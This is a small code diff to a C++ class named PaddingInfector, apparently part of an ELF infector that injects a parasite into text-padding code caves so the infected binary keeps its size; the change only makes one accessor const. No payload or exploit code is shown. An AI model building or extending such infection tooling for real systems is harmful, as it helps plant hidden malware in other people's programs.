@@ -55,7 +55,7 @@ class PaddingInfector {
   // Return the size of the binary after a successful infection. Because we
   // inject into text padding, the size of the binary will not change.
   // @return The binary size after a successful infection.
-  size_t injected_host_size() { return host_size_; }
+  size_t injected_host_size() const { return host_size_; }
 
   // Scan the elf to see if it can be injected with a parasite into a code cave.
   // @param host_mapping The host elf mapping.
